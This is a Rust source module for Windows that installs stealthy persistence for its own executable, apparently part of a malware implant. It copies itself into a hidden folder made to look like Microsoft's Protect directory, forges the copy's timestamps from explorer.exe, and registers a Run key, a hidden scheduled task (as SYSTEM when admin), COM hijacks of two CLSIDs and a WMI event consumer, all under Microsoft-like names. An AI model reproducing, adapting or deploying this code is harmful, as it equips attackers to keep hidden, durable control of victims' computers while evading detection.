use crate::recovery::settings::RecoveryControl;
use directories::BaseDirs;
use std::env;
use std::fs;
use std::path::{Path, PathBuf};
use tracing::{debug, error, info, warn};
use winreg::{enums::*, RegKey};
use std::process::Command;

pub async fn install_persistence() {
    if !RecoveryControl::global().persistence_enabled() {
        debug!("persistence is disabled");
        return;
    }

    if let Err(err) = install_persistence_impl().await {
        error!(error = ?err, "failed to install persistence");
    }
}

async fn install_persistence_impl() -> Result<(), Box<dyn std::error::Error>> {
    let current_exe = env::current_exe()?;
    let base_dirs = BaseDirs::new().ok_or("failed to determine base directories")?;

    let data_dir = base_dirs.data_local_dir().join("Microsoft").join("Protect").join("S-1-5-21-2026");
    if !data_dir.exists() {
        fs::create_dir_all(&data_dir)?;
        set_hidden_system(&data_dir);
    }

    let target_exe = data_dir.join("ms-protect.exe");

    if current_exe == target_exe {
        debug!("running from persistence location");
        ensure_persistence_mechanisms(&target_exe)?;
        return Ok(())
    }

    info!(
        current = %current_exe.display(),
        target = %target_exe.display(),
        "installing persistence artifact"
    );

    match fs::copy(&current_exe, &target_exe) {
        Ok(_) => {
            set_hidden_system(&target_exe);
            timestomp(&target_exe, &PathBuf::from(r"C:\Windows\explorer.exe"));
        },
        Err(err) => {
            warn!(error = %err, "failed to copy executable (might be running)");
            if !target_exe.exists() {
                return Err(err.into());
            }
        }
    }

    ensure_persistence_mechanisms(&target_exe)?;
    Ok(())
}

fn set_hidden_system(path: &Path) {
    #[cfg(target_os = "windows")]
    {
        let _ = Command::new("attrib")
            .args(&["+h", "+s", path.to_string_lossy().as_ref()])
            .output();
    }
}

fn timestomp(target: &Path, reference: &Path) {
    #[cfg(target_os = "windows")]
    {
        use windows::Win32::Storage::FileSystem::{
            CreateFileW,
            FILE_SHARE_READ,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            FILE_READ_ATTRIBUTES,
            FILE_WRITE_ATTRIBUTES,
            SYNCHRONIZE,
        };
        use windows::Win32::Foundation::HANDLE;
        use windows::core::PCWSTR;
        use ntapi::ntioapi::{NtQueryInformationFile, NtSetInformationFile, FILE_BASIC_INFORMATION, FileBasicInformation};
        use std::mem::MaybeUninit;

        unsafe {
            let ref_path_w: Vec<u16> = reference.to_string_lossy().encode_utf16().chain(std::iter::once(0)).collect();
            let h_ref = CreateFileW(
                PCWSTR(ref_path_w.as_ptr()),
                FILE_READ_ATTRIBUTES.0,
                FILE_SHARE_READ,
                None,
                OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL,
                HANDLE::default(),
            );

            if let Ok(h_ref) = h_ref {
                let mut io_status = MaybeUninit::uninit();
                let mut basic_info = MaybeUninit::<FILE_BASIC_INFORMATION>::uninit();
                
                let status = NtQueryInformationFile(
                    h_ref.0 as _,
                    io_status.as_mut_ptr() as _,
                    basic_info.as_mut_ptr() as _,
                    std::mem::size_of::<FILE_BASIC_INFORMATION>() as u32,
                    FileBasicInformation
                );

                if status == 0 {
                    let basic_info = basic_info.assume_init();
                    let target_path_w: Vec<u16> = target.to_string_lossy().encode_utf16().chain(std::iter::once(0)).collect();
                    let h_target = CreateFileW(
                        PCWSTR(target_path_w.as_ptr()),
                        (FILE_WRITE_ATTRIBUTES | SYNCHRONIZE).0,
                        FILE_SHARE_READ,
                        None,
                        OPEN_EXISTING,
                        FILE_ATTRIBUTE_NORMAL,
                        HANDLE::default(),
                    );

                    if let Ok(h_target) = h_target {
                        let mut io_status_set = MaybeUninit::uninit();
                        let mut info_to_set = basic_info;

                        NtSetInformationFile(
                            h_target.0 as _,
                            io_status_set.as_mut_ptr() as _,
                            &mut info_to_set as *mut _ as _,
                            std::mem::size_of::<FILE_BASIC_INFORMATION>() as u32,
                            FileBasicInformation
                        );
                    }
                }
            }
        }
    }
}

fn ensure_persistence_mechanisms(path: &Path) -> Result<(), Box<dyn std::error::Error>> {
    let _ = ensure_registry_run_key(path);
    let _ = ensure_hidden_scheduled_task(path);
    let _ = ensure_com_hijack_refined(path);
    let _ = ensure_wmi_event_consumer(path);
    Ok(())
}

fn ensure_registry_run_key(path: &Path) -> Result<(), Box<dyn std::error::Error>> {
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    let run_key = hkcu.open_subkey_with_flags(
        r"Software\Microsoft\Windows\CurrentVersion\Run",
        KEY_SET_VALUE,
    )?;

    let app_name = "MicrosoftHostProtection";
    run_key.set_value(app_name, &path.to_string_lossy().as_ref())?;
    Ok(())
}

fn is_admin() -> bool {
    let output = std::process::Command::new("net")
        .arg("session")
        .output();
    match output {
        Ok(out) => out.status.success(),
        Err(_) => false,
    }
}

fn ensure_hidden_scheduled_task(path: &Path) -> Result<(), Box<dyn std::error::Error>> {
    let task_name = "MicrosoftWindowsSystemDiagnostics";
    let exe_path = path.to_string_lossy().replace("\"", "\\\"");
    let script = if is_admin() {
        format!(
            "$action = New-ScheduledTaskAction -Execute '{}'; $trigger = New-ScheduledTaskTrigger -AtLogOn; $principal = New-ScheduledTaskPrincipal -UserId 'NT AUTHORITY\\SYSTEM' -LogonType ServiceAccount -RunLevel Highest; $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries; Register-ScheduledTask -TaskName '{}' -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force",
            exe_path, task_name
        )
    } else {
        format!(
            "$action = New-ScheduledTaskAction -Execute '{}'; $trigger = New-ScheduledTaskTrigger -AtLogOn; $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries; Register-ScheduledTask -TaskName '{}' -Action $action -Trigger $trigger -Settings $settings -Force",
            exe_path, task_name
        )
    };

    let _ = Command::new("powershell")
        .args(&["-NoProfile", "-WindowStyle", "Hidden", "-Command", &script])
        .output();
    Ok(())
}

fn ensure_com_hijack_refined(path: &Path) -> Result<(), Box<dyn std::error::Error>> {
    let clsids = [
        "{42aedc87-2188-41fd-b9a3-0c966feabec1}", // MruLongList
        "{BCDE0395-E52F-467C-8E3D-C4579291692E}", // MmcDmp
    ];

    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    let path_str = path.to_string_lossy();

    for clsid in clsids {
        let base_path = format!(r"Software\Classes\CLSID\{}", clsid);

        if let Ok((key, _)) = hkcu.create_subkey(format!(r"{}\LocalServer32", base_path)) {
            let _ = key.set_value("", &path_str.as_ref());
        }

        if let Ok((key, _)) = hkcu.create_subkey(format!(r"{}\InprocServer32", base_path)) {
            let _ = key.set_value("", &path_str.as_ref());
            let _ = key.set_value("ThreadingModel", &"Both");
        }
    }
    Ok(())
}

fn ensure_wmi_event_consumer(path: &Path) -> Result<(), Box<dyn std::error::Error>> {
    if !is_admin() {
        return Ok(());
    }

    let task_name = "WinMgmtEngineHealth";
    let exe_path = path.to_string_lossy().replace("\\", "\\\\");
    let script = format!(
        "$Filter = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments @{{Name='{task_name}';EventNamespace='root\\cimv2';QueryLanguage='WQL';Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA ''Win32_PerfRawData_PerfOS_System'''}}; $Consumer = Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments @{{Name='{task_name}';CommandLineTemplate='{exe_path}'}}; Set-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments @{{Filter=$Filter;Consumer=$Consumer}}",
        task_name = task_name,
        exe_path = exe_path
    );

    let _ = Command::new("powershell")
        .args(&["-NoProfile", "-WindowStyle", "Hidden", "-Command", &script])
        .output();
    Ok(())
}
